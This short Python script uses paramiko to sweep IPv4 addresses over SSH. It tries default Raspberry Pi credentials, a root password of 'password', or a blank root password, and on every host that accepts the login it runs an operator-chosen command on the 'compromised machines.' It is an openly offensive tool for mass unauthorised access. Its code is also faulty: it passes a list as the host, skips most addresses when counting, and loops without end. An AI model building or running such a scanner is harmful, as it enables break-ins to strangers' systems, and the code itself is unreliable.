import paramiko
ssh = paramiko.SSHClient()
run = False
while(run == False):
	print("Menu")
	print("1. Search for raspis with default login")
	print("2. Search for any Linux machine with root password \"password\"")
	print("3. Search for any Linux machine with blank root password")
	selection = int(input(">"))
	if(selection == 1 or selection == 2 or selection == 3):
		command = input("Command to run on compromised machines: ")
		run = True
	else:
		print("Invalid selection!")
		
username = "root"
password = ""
if(selection == 1):
	password = "raspberry"
	username = "pi"
elif(selection == 2):
	password = "password"

ip = [1, 0, 0, 0]

while(run == True):
	try:
		ssh.connect(ip, username=username, password=password)
		ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
		print("IP " + str(ip) + " SUCCESS")
	except:
		print("IP " + str(ip) + " FAIL") 
	if(ip[3] < 255):
		ip[3] += 1
	elif(ip[2] < 255):
		ip[2] += 1
	elif(ip[1] < 255):
		ip[1] += 1
	elif(ip[0] < 191):
		ip[0] += 1
	else:
		print("ALL POSSIBLE IP ADDR. TRIED")
